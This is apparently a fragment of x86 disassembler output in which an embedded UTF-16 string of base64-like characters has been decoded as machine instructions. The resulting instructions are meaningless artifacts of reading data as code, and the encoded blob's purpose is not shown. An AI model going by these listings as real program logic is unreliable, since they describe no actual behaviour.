  40a19f:	00 39                	add    %bh,(%ecx)
  40a1a1:	00 73 00             	add    %dh,0x0(%ebx)
  40a1a4:	33 00                	xor    (%eax),%eax
  40a1a6:	74 00                	je     0x40a1a8
  40a1a8:	71 00                	jno    0x40a1aa
  40a1aa:	73 00                	jae    0x40a1ac
  40a1ac:	6f                   	outsl  %ds:(%esi),(%dx)
  40a1ad:	00 79 00             	add    %bh,0x0(%ecx)
  40a1b0:	43                   	inc    %ebx
  40a1b1:	00 55 00             	add    %dl,0x0(%ebp)
  40a1b4:	76 00                	jbe    0x40a1b6
  40a1b6:	55                   	push   %ebp
  40a1b7:	00 48 00             	add    %cl,0x0(%eax)
  40a1ba:	72 00                	jb     0x40a1bc
  40a1bc:	2f                   	das
  40a1bd:	00 66 00             	add    %ah,0x0(%esi)
  40a1c0:	68 00 7a 00 77       	push   $0x77007a00
  40a1c5:	00 65 00             	add    %ah,0x0(%ebp)
  40a1c8:	63 00                	arpl   %eax,(%eax)
  40a1ca:	46                   	inc    %esi
  40a1cb:	00 73 00             	add    %dh,0x0(%ebx)
  40a1ce:	7a 00                	jp     0x40a1d0
  40a1d0:	77 00                	ja     0x40a1d2
  40a1d2:	37                   	aaa
  40a1d3:	00 5a 00             	add    %bl,0x0(%edx)
  40a1d6:	68 00 76 00 66       	push   $0x66007600
  40a1db:	00 33                	add    %dh,(%ebx)
  40a1dd:	00 76 00             	add    %dh,0x0(%esi)
  40a1e0:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a1e3:	00 4e 00             	add    %cl,0x0(%esi)
  40a1e6:	70 00                	jo     0x40a1e8
  40a1e8:	76 00                	jbe    0x40a1ea
  40a1ea:	30 00                	xor    %al,(%eax)
  40a1ec:	50                   	push   %eax
  40a1ed:	00 42 00             	add    %al,0x0(%edx)
  40a1f0:	48                   	dec    %eax
  40a1f1:	00 6a 00             	add    %ch,0x0(%edx)
  40a1f4:	41                   	inc    %ecx
  40a1f5:	00 52 00             	add    %dl,0x0(%edx)
  40a1f8:	6c                   	insb   (%dx),%es:(%edi)
  40a1f9:	00 55 00             	add    %dl,0x0(%ebp)
  40a1fc:	38 00                	cmp    %al,(%eax)
  40a1fe:	6e                   	outsb  %ds:(%esi),(%dx)
  40a1ff:	00 33                	add    %dh,(%ebx)
  40a201:	00 5a 00             	add    %bl,0x0(%edx)
  40a204:	66 00 6e 00          	data16 add %ch,0x0(%esi)
  40a208:	5a                   	pop    %edx
  40a209:	00 6a 00             	add    %ch,0x0(%edx)
  40a20c:	51                   	push   %ecx
  40a20d:	00 35 00 59 00 4e    	add    %dh,0x4e005900
  40a213:	00 43 00             	add    %al,0x0(%ebx)
  40a216:	30 00                	xor    %al,(%eax)
  40a218:	39 00                	cmp    %eax,(%eax)
  40a21a:	4c                   	dec    %esp
  40a21b:	00 74 00 2b          	add    %dh,0x2b(%eax,%eax,1)
  40a21f:	00 4c 00 33          	add    %cl,0x33(%eax,%eax,1)
  40a223:	00 64 00 63          	add    %ah,0x63(%eax,%eax,1)
  40a227:	00 61 00             	add    %ah,0x0(%ecx)
  40a22a:	53                   	push   %ebx
  40a22b:	00 39                	add    %bh,(%ecx)
  40a22d:	00 66 00             	add    %ah,0x0(%esi)
  40a230:	57                   	push   %edi
  40a231:	00 6a 00             	add    %ch,0x0(%edx)
  40a234:	67 00 6a 00          	add    %ch,0x0(%bp,%si)
  40a238:	69 00 68 00 35 00    	imul   $0x350068,(%eax),%eax
  40a23e:	75 00                	jne    0x40a240
  40a240:	6f                   	outsl  %ds:(%esi),(%dx)
  40a241:	00 2b                	add    %ch,(%ebx)
  40a243:	00 57 00             	add    %dl,0x0(%edi)
  40a246:	4f                   	dec    %edi
  40a247:	00 78 00             	add    %bh,0x0(%eax)
  40a24a:	77 00                	ja     0x40a24c
  40a24c:	64 00 30             	add    %dh,%fs:(%eax)
  40a24f:	00 4e 00             	add    %cl,0x0(%esi)
  40a252:	6d                   	insl   (%dx),%es:(%edi)
  40a253:	00 73 00             	add    %dh,0x0(%ebx)
  40a256:	6b 00 66             	imul   $0x66,(%eax),%eax
  40a259:	00 36                	add    %dh,(%esi)
  40a25b:	00 4e 00             	add    %cl,0x0(%esi)
  40a25e:	69 00 6c 00 50 00    	imul   $0x50006c,(%eax),%eax
  40a264:	36 00 59 00          	add    %bl,%ss:0x0(%ecx)
  40a268:	7a 00                	jp     0x40a26a
  40a26a:	47                   	inc    %edi
  40a26b:	00 76 00             	add    %dh,0x0(%esi)
  40a26e:	66 00 51 00          	data16 add %dl,0x0(%ecx)
  40a272:	51                   	push   %ecx
  40a273:	00 78 00             	add    %bh,0x0(%eax)
  40a276:	62 00                	bound  %eax,(%eax)
  40a278:	6e                   	outsb  %ds:(%esi),(%dx)
  40a279:	00 54 00 2b          	add    %dl,0x2b(%eax,%eax,1)
  40a27d:	00 61 00             	add    %ah,0x0(%ecx)
  40a280:	67 00 7a 00          	add    %bh,0x0(%bp,%si)
  40a284:	4e                   	dec    %esi
  40a285:	00 56 00             	add    %dl,0x0(%esi)
  40a288:	4b                   	dec    %ebx
  40a289:	00 56 00             	add    %dl,0x0(%esi)
  40a28c:	75 00                	jne    0x40a28e
  40a28e:	61                   	popa
  40a28f:	00 4c 00 58          	add    %cl,0x58(%eax,%eax,1)
  40a293:	00 4c 00 32          	add    %cl,0x32(%eax,%eax,1)
  40a297:	00 32                	add    %dh,(%edx)
  40a299:	00 2b                	add    %ch,(%ebx)
  40a29b:	00 59 00             	add    %bl,0x0(%ecx)
  40a29e:	75 00                	jne    0x40a2a0
  40a2a0:	51                   	push   %ecx
  40a2a1:	00 46 00             	add    %al,0x0(%esi)
  40a2a4:	4e                   	dec    %esi
  40a2a5:	00 76 00             	add    %dh,0x0(%esi)
  40a2a8:	62 00                	bound  %eax,(%eax)
  40a2aa:	5a                   	pop    %edx
  40a2ab:	00 57 00             	add    %dl,0x0(%edi)
  40a2ae:	74 00                	je     0x40a2b0
  40a2b0:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2b1:	00 6e 00             	add    %ch,0x0(%esi)
  40a2b4:	74 00                	je     0x40a2b6
  40a2b6:	43                   	inc    %ebx
  40a2b7:	00 32                	add    %dh,(%edx)
  40a2b9:	00 41 00             	add    %al,0x0(%ecx)
  40a2bc:	43                   	inc    %ebx
  40a2bd:	00 4a 00             	add    %cl,0x0(%edx)
  40a2c0:	56                   	push   %esi
  40a2c1:	00 48 00             	add    %cl,0x0(%eax)
  40a2c4:	4b                   	dec    %ebx
  40a2c5:	00 47 00             	add    %al,0x0(%edi)
  40a2c8:	42                   	inc    %edx
  40a2c9:	00 6f 00             	add    %ch,0x0(%edi)
  40a2cc:	64 00 64 00 61       	add    %ah,%fs:0x61(%eax,%eax,1)
  40a2d1:	00 61 00             	add    %ah,0x0(%ecx)
  40a2d4:	76 00                	jbe    0x40a2d6
  40a2d6:	6f                   	outsl  %ds:(%esi),(%dx)
  40a2d7:	00 71 00             	add    %dh,0x0(%ecx)
  40a2da:	30 00                	xor    %al,(%eax)
  40a2dc:	69 00 61 00 55 00    	imul   $0x550061,(%eax),%eax
  40a2e2:	48                   	dec    %eax
  40a2e3:	00 35 00 77 00 6d    	add    %dh,0x6d007700
  40a2e9:	00 36                	add    %dh,(%esi)
  40a2eb:	00 65 00             	add    %ah,0x0(%ebp)
  40a2ee:	37                   	aaa
  40a2ef:	00 64 00 46          	add    %ah,0x46(%eax,%eax,1)
  40a2f3:	00 78 00             	add    %bh,0x0(%eax)
  40a2f6:	54                   	push   %esp
  40a2f7:	00 79 00             	add    %bh,0x0(%ecx)
  40a2fa:	53                   	push   %ebx
  40a2fb:	00 6d 00             	add    %ch,0x0(%ebp)
  40a2fe:	74 00                	je     0x40a300
  40a300:	6b 00 4e             	imul   $0x4e,(%eax),%eax
  40a303:	00 4e 00             	add    %cl,0x0(%esi)
  40a306:	4e                   	dec    %esi
  40a307:	00 41 00             	add    %al,0x0(%ecx)
  40a30a:	39 00                	cmp    %eax,(%eax)
  40a30c:	31 00                	xor    %eax,(%eax)
  40a30e:	77 00                	ja     0x40a310
  40a310:	6c                   	insb   (%dx),%es:(%edi)
  40a311:	00 37                	add    %dh,(%edi)
  40a313:	00 42 00             	add    %al,0x0(%edx)
  40a316:	64 00 48 00          	add    %cl,%fs:0x0(%eax)
  40a31a:	30 00                	xor    %al,(%eax)
  40a31c:	46                   	inc    %esi
  40a31d:	00 36                	add    %dh,(%esi)
  40a31f:	00 75 00             	add    %dh,0x0(%ebp)
  40a322:	42                   	inc    %edx
  40a323:	00 42 00             	add    %al,0x0(%edx)
  40a326:	75 00                	jne    0x40a328
  40a328:	33 00                	xor    (%eax),%eax
  40a32a:	57                   	push   %edi
  40a32b:	00 62 00             	add    %ah,0x0(%edx)
  40a32e:	6d                   	insl   (%dx),%es:(%edi)
  40a32f:	00 69 00             	add    %ch,0x0(%ecx)
  40a332:	64 00 39             	add    %bh,%fs:(%ecx)
  40a335:	00 61 00             	add    %ah,0x0(%ecx)
  40a338:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a33b:	00 48 00             	add    %cl,0x0(%eax)
  40a33e:	63 00                	arpl   %eax,(%eax)
  40a340:	46                   	inc    %esi
  40a341:	00 4d 00             	add    %cl,0x0(%ebp)
  40a344:	52                   	push   %edx
  40a345:	00 2b                	add    %ch,(%ebx)
  40a347:	00 44 00 6f          	add    %al,0x6f(%eax,%eax,1)
  40a34b:	00 64 00 31          	add    %ah,0x31(%eax,%eax,1)
  40a34f:	00 6e 00             	add    %ch,0x0(%esi)
  40a352:	61                   	popa
  40a353:	00 56 00             	add    %dl,0x0(%esi)
  40a356:	68 00 61 00 41       	push   $0x41006100
  40a35b:	00 63 00             	add    %ah,0x0(%ebx)
  40a35e:	55                   	push   %ebp
  40a35f:	00 64 00 32          	add    %ah,0x32(%eax,%eax,1)
  40a363:	00 58 00             	add    %bl,0x0(%eax)
  40a366:	70 00                	jo     0x40a368
  40a368:	6c                   	insb   (%dx),%es:(%edi)
  40a369:	00 41 00             	add    %al,0x0(%ecx)
  40a36c:	6e                   	outsb  %ds:(%esi),(%dx)
  40a36d:	00 70 00             	add    %dh,0x0(%eax)
  40a370:	48                   	dec    %eax
  40a371:	00 59 00             	add    %bl,0x0(%ecx)
  40a374:	72 00                	jb     0x40a376
  40a376:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40a37a:	2b 00                	sub    (%eax),%eax
  40a37c:	67 00 76 00          	add    %dh,0x0(%bp)
  40a380:	46                   	inc    %esi
  40a381:	00 4a 00             	add    %cl,0x0(%edx)
  40a384:	4e                   	dec    %esi
  40a385:	00 79 00             	add    %bh,0x0(%ecx)
  40a388:	30 00                	xor    %al,(%eax)
  40a38a:	4e                   	dec    %esi
  40a38b:	00 70 00             	add    %dh,0x0(%eax)
  40a38e:	59                   	pop    %ecx
  40a38f:	00 4b 00             	add    %cl,0x0(%ebx)
  40a392:	61                   	popa
  40a393:	00 67 00             	add    %ah,0x0(%edi)
  40a396:	38 00                	cmp    %al,(%eax)
  40a398:	65 00 46 00          	add    %al,%gs:0x0(%esi)
  40a39c:	35 00 70 00 45       	xor    $0x45007000,%eax
  40a3a1:	00 33                	add    %dh,(%ebx)
  40a3a3:	00 35 00 4b 00 76    	add    %dh,0x76004b00
  40a3a9:	00 43 00             	add    %al,0x0(%ebx)
  40a3ac:	32 00                	xor    (%eax),%al
  40a3ae:	47                   	inc    %edi
  40a3af:	00 31                	add    %dh,(%ecx)
  40a3b1:	00 6c 00 5a          	add    %ch,0x5a(%eax,%eax,1)
  40a3b5:	00 66 00             	add    %ah,0x0(%esi)
  40a3b8:	44                   	inc    %esp
  40a3b9:	00 7a 00             	add    %bh,0x0(%edx)
  40a3bc:	63 00                	arpl   %eax,(%eax)
  40a3be:	2b 00                	sub    (%eax),%eax
  40a3c0:	4c                   	dec    %esp
  40a3c1:	00 41 00             	add    %al,0x0(%ecx)
  40a3c4:	74 00                	je     0x40a3c6
  40a3c6:	49                   	dec    %ecx
  40a3c7:	00 4c 00 6e          	add    %cl,0x6e(%eax,%eax,1)
  40a3cb:	00 56 00             	add    %dl,0x0(%esi)
  40a3ce:	31 00                	xor    %eax,(%eax)
  40a3d0:	7a 00                	jp     0x40a3d2
  40a3d2:	31 00                	xor    %eax,(%eax)
  40a3d4:	6b 00 51             	imul   $0x51,(%eax),%eax
  40a3d7:	00 76 00             	add    %dh,0x0(%esi)
  40a3da:	46                   	inc    %esi
  40a3db:	00 73 00             	add    %dh,0x0(%ebx)
  40a3de:	59                   	pop    %ecx
  40a3df:	00 4f 00             	add    %cl,0x0(%edi)
  40a3e2:	32 00                	xor    (%eax),%al
  40a3e4:	46                   	inc    %esi
  40a3e5:	00 4b 00             	add    %cl,0x0(%ebx)
  40a3e8:	31 00                	xor    %eax,(%eax)
  40a3ea:	75 00                	jne    0x40a3ec
  40a3ec:	77 00                	ja     0x40a3ee
  40a3ee:	50                   	push   %eax
  40a3ef:	00 56 00             	add    %dl,0x0(%esi)
  40a3f2:	4a                   	dec    %edx
  40a3f3:	00 53 00             	add    %dl,0x0(%ebx)
  40a3f6:	77 00                	ja     0x40a3f8
  40a3f8:	2b 00                	sub    (%eax),%eax
  40a3fa:	79 00                	jns    0x40a3fc
  40a3fc:	72 00                	jb     0x40a3fe
  40a3fe:	66 00 34 00          	data16 add %dh,(%eax,%eax,1)
  40a402:	46                   	inc    %esi
  40a403:	00 33                	add    %dh,(%ebx)
  40a405:	00 56 00             	add    %dl,0x0(%esi)
  40a408:	47                   	inc    %edi
  40a409:	00 74 00 73          	add    %dh,0x73(%eax,%eax,1)
  40a40d:	00 41 00             	add    %al,0x0(%ecx)
  40a410:	6f                   	outsl  %ds:(%esi),(%dx)
  40a411:	00 56 00             	add    %dl,0x0(%esi)
  40a414:	7a 00                	jp     0x40a416
  40a416:	69 00 7a 00 42 00    	imul   $0x42007a,(%eax),%eax
  40a41c:	47                   	inc    %edi
  40a41d:	00 58 00             	add    %bl,0x0(%eax)
  40a420:	37                   	aaa
  40a421:	00 6b 00             	add    %ch,0x0(%ebx)
  40a424:	6a 00                	push   $0x0
  40a426:	58                   	pop    %eax
  40a427:	00 4d 00             	add    %cl,0x0(%ebp)
  40a42a:	70 00                	jo     0x40a42c
  40a42c:	56                   	push   %esi
  40a42d:	00 30                	add    %dh,(%eax)
  40a42f:	00 43 00             	add    %al,0x0(%ebx)
  40a432:	4f                   	dec    %edi
  40a433:	00 77 00             	add    %dh,0x0(%edi)
  40a436:	68 00 53 00 5a       	push   $0x5a005300
  40a43b:	00 73 00             	add    %dh,0x0(%ebx)
  40a43e:	37                   	aaa
  40a43f:	00 33                	add    %dh,(%ebx)
  40a441:	00 72 00             	add    %dh,0x0(%edx)
  40a444:	70 00                	jo     0x40a446
  40a446:	34 00                	xor    $0x0,%al
  40a448:	59                   	pop    %ecx
  40a449:	00 57 00             	add    %dl,0x0(%edi)
  40a44c:	59                   	pop    %ecx
  40a44d:	00 68 00             	add    %ch,0x0(%eax)
  40a450:	2b 00                	sub    (%eax),%eax
  40a452:	7a 00                	jp     0x40a454
  40a454:	43                   	inc    %ebx
  40a455:	00 35 00 65 00 6e    	add    %dh,0x6e006500
  40a45b:	00 78 00             	add    %bh,0x0(%eax)
  40a45e:	59                   	pop    %ecx
  40a45f:	00 38                	add    %bh,(%eax)
  40a461:	00 54 00 68          	add    %dl,0x68(%eax,%eax,1)
  40a465:	00 70 00             	add    %dh,0x0(%eax)
  40a468:	55                   	push   %ebp
  40a469:	00 78 00             	add    %bh,0x0(%eax)
  40a46c:	33 00                	xor    (%eax),%eax
  40a46e:	57                   	push   %edi
  40a46f:	00 65 00             	add    %ah,0x0(%ebp)
  40a472:	4e                   	dec    %esi
  40a473:	00 37                	add    %dh,(%edi)
  40a475:	00 68 00             	add    %ch,0x0(%eax)
  40a478:	75 00                	jne    0x40a47a
  40a47a:	51                   	push   %ecx
  40a47b:	00 7a 00             	add    %bh,0x0(%edx)
  40a47e:	59                   	pop    %ecx
  40a47f:	00 4f 00             	add    %cl,0x0(%edi)
  40a482:	32 00                	xor    (%eax),%al
  40a484:	42                   	inc    %edx
  40a485:	00 5a 00             	add    %bl,0x0(%edx)
  40a488:	72 00                	jb     0x40a48a
  40a48a:	59                   	pop    %ecx
  40a48b:	00 71 00             	add    %dh,0x0(%ecx)
  40a48e:	56                   	push   %esi
  40a48f:	00 73 00             	add    %dh,0x0(%ebx)
  40a492:	55                   	push   %ebp
  40a493:	00 2f                	add    %ch,(%edi)
  40a495:	00 38                	add    %bh,(%eax)
  40a497:	00 56 00             	add    %dl,0x0(%esi)
  40a49a:	4a                   	dec    %edx
  40a49b:	00 56 00             	add    %dl,0x0(%esi)
  40a49e:	6a 00                	push   $0x0
  40a4a0:	72 00                	jb     0x40a4a2
  40a4a2:	79 00                	jns    0x40a4a4
  40a4a4:	47                   	inc    %edi
  40a4a5:	00 71 00             	add    %dh,0x0(%ecx)
  40a4a8:	7a 00                	jp     0x40a4aa
  40a4aa:	70 00                	jo     0x40a4ac
  40a4ac:	70 00                	jo     0x40a4ae
  40a4ae:	64 00 55 00          	add    %dl,%fs:0x0(%ebp)
  40a4b2:	49                   	dec    %ecx
  40a4b3:	00 54 00 75          	add    %dl,0x75(%eax,%eax,1)
  40a4b7:	00 65 00             	add    %ah,0x0(%ebp)
  40a4ba:	31 00                	xor    %eax,(%eax)
  40a4bc:	56                   	push   %esi
  40a4bd:	00 49 00             	add    %cl,0x0(%ecx)
  40a4c0:	6a 00                	push   $0x0
  40a4c2:	67 00 6c 00          	add    %ch,0x0(%si)
  40a4c6:	6b 00 41             	imul   $0x41,(%eax),%eax
  40a4c9:	00 38                	add    %bh,(%eax)
  40a4cb:	00 65 00             	add    %ah,0x0(%ebp)
  40a4ce:	6a 00                	push   $0x0
  40a4d0:	58                   	pop    %eax
  40a4d1:	00 69 00             	add    %ch,0x0(%ecx)
  40a4d4:	53                   	push   %ebx
  40a4d5:	00 4b 00             	add    %cl,0x0(%ebx)
  40a4d8:	4d                   	dec    %ebp
  40a4d9:	00 45 00             	add    %al,0x0(%ebp)
  40a4dc:	38 00                	cmp    %al,(%eax)
  40a4de:	31 00                	xor    %eax,(%eax)
  40a4e0:	70 00                	jo     0x40a4e2
  40a4e2:	35 00 71 00 6a       	xor    $0x6a007100,%eax
  40a4e7:	00 38                	add    %bh,(%eax)
  40a4e9:	00 64 00 73          	add    %ah,0x73(%eax,%eax,1)
  40a4ed:	00 4c 00 38          	add    %cl,0x38(%eax,%eax,1)
  40a4f1:	00 44 00 6c          	add    %al,0x6c(%eax,%eax,1)
  40a4f5:	00 73 00             	add    %dh,0x0(%ebx)
  40a4f8:	79 00                	jns    0x40a4fa
  40a4fa:	72 00                	jb     0x40a4fc
  40a4fc:	70 00                	jo     0x40a4fe
  40a4fe:	56                   	push   %esi
  40a4ff:	00 6b 00             	add    %ch,0x0(%ebx)
  40a502:	36 00 78 00          	add    %bh,%ss:0x0(%eax)
  40a506:	57                   	push   %edi
  40a507:	00 69 00             	add    %ch,0x0(%ecx)
  40a50a:	63 00                	arpl   %eax,(%eax)
  40a50c:	7a 00                	jp     0x40a50e
  40a50e:	4c                   	dec    %esp
  40a50f:	00 79 00             	add    %bh,0x0(%ecx)
  40a512:	30 00                	xor    %al,(%eax)
  40a514:	76 00                	jbe    0x40a516
  40a516:	4c                   	dec    %esp
  40a517:	00 5a 00             	add    %bl,0x0(%edx)
  40a51a:	56                   	push   %esi
  40a51b:	00 69 00             	add    %ch,0x0(%ecx)
  40a51e:	55                   	push   %ebp
  40a51f:	00 6d 00             	add    %ch,0x0(%ebp)
  40a522:	6b 00 32             	imul   $0x32,(%eax),%eax
  40a525:	00 58 00             	add    %bl,0x0(%eax)
  40a528:	47                   	inc    %edi
  40a529:	00 61 00             	add    %ah,0x0(%ecx)
  40a52c:	38 00                	cmp    %al,(%eax)
  40a52e:	31 00                	xor    %eax,(%eax)
  40a530:	50                   	push   %eax
  40a531:	00 6b 00             	add    %ch,0x0(%ebx)
  40a534:	49                   	dec    %ecx
  40a535:	00 69 00             	add    %ch,0x0(%ecx)
  40a538:	69 00 55 00 51 00    	imul   $0x510055,(%eax),%eax
  40a53e:	53                   	push   %ebx
  40a53f:	00 6f 00             	add    %ch,0x0(%edi)
  40a542:	32 00                	xor    (%eax),%al
  40a544:	6b 00 75             	imul   $0x75,(%eax),%eax
  40a547:	00 73 00             	add    %dh,0x0(%ebx)
  40a54a:	68 00 49 00 75       	push   $0x75004900
  40a54f:	00 50 00             	add    %dl,0x0(%eax)
  40a552:	54                   	push   %esp
  40a553:	00 2b                	add    %ch,(%ebx)
  40a555:	00 45 00             	add    %al,0x0(%ebp)
  40a558:	77 00                	ja     0x40a55a
  40a55a:	38 00                	cmp    %al,(%eax)
  40a55c:	71 00                	jno    0x40a55e
  40a55e:	47                   	inc    %edi
  40a55f:	00 47 00             	add    %al,0x0(%edi)
  40a562:	68 00 57 00 45       	push   $0x45005700
  40a567:	00 53 00             	add    %dl,0x0(%ebx)
  40a56a:	51                   	push   %ecx
  40a56b:	00 57 00             	add    %dl,0x0(%edi)
  40a56e:	48                   	dec    %eax
  40a56f:	00 6e 00             	add    %ch,0x0(%esi)
  40a572:	41                   	inc    %ecx
  40a573:	00 4a 00             	add    %cl,0x0(%edx)
  40a576:	45                   	inc    %ebp
  40a577:	00 57 00             	add    %dl,0x0(%edi)
  40a57a:	30 00                	xor    %al,(%eax)
  40a57c:	6f                   	outsl  %ds:(%esi),(%dx)
  40a57d:	00 32                	add    %dh,(%edx)
  40a57f:	00 56 00             	add    %dl,0x0(%esi)
  40a582:	56                   	push   %esi
  40a583:	00 78 00             	add    %bh,0x0(%eax)
  40a586:	77 00                	ja     0x40a588
  40a588:	30 00                	xor    %al,(%eax)
  40a58a:	4f                   	dec    %edi
  40a58b:	00 43 00             	add    %al,0x0(%ebx)
  40a58e:	77 00                	ja     0x40a590
  40a590:	65 00 35 00 66 00 73 	add    %dh,%gs:0x73006600
  40a597:	00 31                	add    %dh,(%ecx)
  40a599:	00 36                	add    %dh,(%esi)
  40a59b:	00 76 00             	add    %dh,0x0(%esi)
  40a59e:	41                   	inc    %ecx
  40a59f:	00 72 00             	add    %dh,0x0(%edx)
  40a5a2:	32 00                	xor    (%eax),%al
  40a5a4:	49                   	dec    %ecx
  40a5a5:	00 42 00             	add    %al,0x0(%edx)
  40a5a8:	2b 00                	sub    (%eax),%eax
  40a5aa:	50                   	push   %eax
  40a5ab:	00 52 00             	add    %dl,0x0(%edx)
  40a5ae:	2b 00                	sub    (%eax),%eax
  40a5b0:	6e                   	outsb  %ds:(%esi),(%dx)
  40a5b1:	00 2f                	add    %ch,(%edi)
  40a5b3:	00 51 00             	add    %dl,0x0(%ecx)
  40a5b6:	4e                   	dec    %esi
  40a5b7:	00 35 00 71 00 35    	add    %dh,0x35007100
  40a5bd:	00 4b 00             	add    %cl,0x0(%ebx)
  40a5c0:	39 00                	cmp    %eax,(%eax)
  40a5c2:	6b 00 6b             	imul   $0x6b,(%eax),%eax
  40a5c5:	00 73 00             	add    %dh,0x0(%ebx)
  40a5c8:	65 00 4e 00          	add    %cl,%gs:0x0(%esi)
  40a5cc:	4a                   	dec    %edx
  40a5cd:	00 75 00             	add    %dh,0x0(%ebp)
  40a5d0:	68 00 48 00 30       	push   $0x30004800
  40a5d5:	00 70 00             	add    %dh,0x0(%eax)
  40a5d8:	75 00                	jne    0x40a5da
  40a5da:	58                   	pop    %eax
  40a5db:	00 4b 00             	add    %cl,0x0(%ebx)
  40a5de:	55                   	push   %ebp
  40a5df:	00 5a 00             	add    %bl,0x0(%edx)
  40a5e2:	37                   	aaa
  40a5e3:	00 64 00 61          	add    %ah,0x61(%eax,%eax,1)
  40a5e7:	00 31                	add    %dh,(%ecx)
  40a5e9:	00 39                	add    %bh,(%ecx)
  40a5eb:	00 43 00             	add    %al,0x0(%ebx)
  40a5ee:	49                   	dec    %ecx
  40a5ef:	00 31                	add    %dh,(%ecx)
  40a5f1:	00 58 00             	add    %bl,0x0(%eax)
  40a5f4:	4a                   	dec    %edx
  40a5f5:	00 4d 00             	add    %cl,0x0(%ebp)
  40a5f8:	72 00                	jb     0x40a5fa
  40a5fa:	6f                   	outsl  %ds:(%esi),(%dx)
  40a5fb:	00 2b                	add    %ch,(%ebx)
  40a5fd:	00 33                	add    %dh,(%ebx)
  40a5ff:	00 2b                	add    %ch,(%ebx)
  40a601:	00 57 00             	add    %dl,0x0(%edi)
  40a604:	6d                   	insl   (%dx),%es:(%edi)
  40a605:	00 41 00             	add    %al,0x0(%ecx)
  40a608:	34 00                	xor    $0x0,%al
  40a60a:	4e                   	dec    %esi
  40a60b:	00 36                	add    %dh,(%esi)
  40a60d:	00 70 00             	add    %dh,0x0(%eax)
  40a610:	4f                   	dec    %edi
  40a611:	00 70 00             	add    %dh,0x0(%eax)
  40a614:	43                   	inc    %ebx
  40a615:	00 48 00             	add    %cl,0x0(%eax)
  40a618:	32 00                	xor    (%eax),%al
  40a61a:	49                   	dec    %ecx
  40a61b:	00 44 00 51          	add    %al,0x51(%eax,%eax,1)
  40a61f:	00 70 00             	add    %dh,0x0(%eax)
  40a622:	2f                   	das
  40a623:	00 4a 00             	add    %cl,0x0(%edx)
  40a626:	34 00                	xor    $0x0,%al
  40a628:	63 00                	arpl   %eax,(%eax)
  40a62a:	79 00                	jns    0x40a62c
  40a62c:	69 00 32 00 5a 00    	imul   $0x5a0032,(%eax),%eax
  40a632:	54                   	push   %esp
  40a633:	00 7a 00             	add    %bh,0x0(%edx)
  40a636:	41                   	inc    %ecx
  40a637:	00 69 00             	add    %ch,0x0(%ecx)
  40a63a:	74 00                	je     0x40a63c
  40a63c:	59                   	pop    %ecx
  40a63d:	00 6a 00             	add    %ch,0x0(%edx)
  40a640:	46                   	inc    %esi
  40a641:	00 71 00             	add    %dh,0x0(%ecx)
  40a644:	4d                   	dec    %ebp
  40a645:	00 56 00             	add    %dl,0x0(%esi)
  40a648:	4c                   	dec    %esp
  40a649:	00 72 00             	add    %dh,0x0(%edx)
  40a64c:	4e                   	dec    %esi
  40a64d:	00 56 00             	add    %dl,0x0(%esi)
  40a650:	54                   	push   %esp
  40a651:	00 53 00             	add    %dl,0x0(%ebx)
  40a654:	71 00                	jno    0x40a656
  40a656:	35 00 4d 00 73       	xor    $0x73004d00,%eax
  40a65b:	00 59 00             	add    %bl,0x0(%ecx)
  40a65e:	65 00 51 00          	add    %dl,%gs:0x0(%ecx)
  40a662:	47                   	inc    %edi
  40a663:	00 33                	add    %dh,(%ebx)
  40a665:	00 51 00             	add    %dl,0x0(%ecx)
  40a668:	6f                   	outsl  %ds:(%esi),(%dx)
  40a669:	00 79 00             	add    %bh,0x0(%ecx)
  40a66c:	64 00 30             	add    %dh,%fs:(%eax)
  40a66f:	00 36                	add    %dh,(%esi)
  40a671:	00 71 00             	add    %dh,0x0(%ecx)
  40a674:	46                   	inc    %esi
  40a675:	00 58 00             	add    %bl,0x0(%eax)
  40a678:	4f                   	dec    %edi
  40a679:	00 6a 00             	add    %ch,0x0(%edx)
  40a67c:	67 00 75 00          	add    %dh,0x0(%di)
  40a680:	70 00                	jo     0x40a682
  40a682:	42                   	inc    %edx
  40a683:	00 63 00             	add    %ah,0x0(%ebx)
  40a686:	59                   	pop    %ecx
  40a687:	00 4e 00             	add    %cl,0x0(%esi)
  40a68a:	78 00                	js     0x40a68c
  40a68c:	61                   	popa
  40a68d:	00 6f 00             	add    %ch,0x0(%edi)
  40a690:	44                   	inc    %esp
  40a691:	00 68 00             	add    %ch,0x0(%eax)
  40a694:	54                   	push   %esp
  40a695:	00 31                	add    %dh,(%ecx)
  40a697:	00 58 00             	add    %bl,0x0(%eax)
  40a69a:	2f                   	das
  40a69b:	00 44 00 49          	add    %al,0x49(%eax,%eax,1)
  40a69f:	00 51 00             	add    %dl,0x0(%ecx)
  40a6a2:	62 00                	bound  %eax,(%eax)
  40a6a4:	71 00                	jno    0x40a6a6
  40a6a6:	53                   	push   %ebx
  40a6a7:	00 66 00             	add    %ah,0x0(%esi)
  40a6aa:	2b 00                	sub    (%eax),%eax
  40a6ac:	7a 00                	jp     0x40a6ae
  40a6ae:	73 00                	jae    0x40a6b0
  40a6b0:	54                   	push   %esp
  40a6b1:	00 59 00             	add    %bl,0x0(%ecx)
  40a6b4:	44                   	inc    %esp
  40a6b5:	00 37                	add    %dh,(%edi)
  40a6b7:	00 37                	add    %dh,(%edi)
  40a6b9:	00 47 00             	add    %al,0x0(%edi)
  40a6bc:	44                   	inc    %esp
  40a6bd:	00 70 00             	add    %dh,0x0(%eax)
  40a6c0:	44                   	inc    %esp
  40a6c1:	00 4d 00             	add    %cl,0x0(%ebp)
  40a6c4:	50                   	push   %eax
  40a6c5:	00 5a 00             	add    %bl,0x0(%edx)
  40a6c8:	4b                   	dec    %ebx
  40a6c9:	00 43 00             	add    %al,0x0(%ebx)
  40a6cc:	4c                   	dec    %esp
  40a6cd:	00 39                	add    %bh,(%ecx)
  40a6cf:	00 59 00             	add    %bl,0x0(%ecx)
  40a6d2:	4d                   	dec    %ebp
  40a6d3:	00 49 00             	add    %cl,0x0(%ecx)
  40a6d6:	4d                   	dec    %ebp
  40a6d7:	00 57 00             	add    %dl,0x0(%edi)
  40a6da:	33 00                	xor    (%eax),%eax
  40a6dc:	76 00                	jbe    0x40a6de
  40a6de:	4b                   	dec    %ebx
  40a6df:	00 4d 00             	add    %cl,0x0(%ebp)
  40a6e2:	42                   	inc    %edx
  40a6e3:	00 70 00             	add    %dh,0x0(%eax)
  40a6e6:	45                   	inc    %ebp
  40a6e7:	00 44 00 59          	add    %al,0x59(%eax,%eax,1)
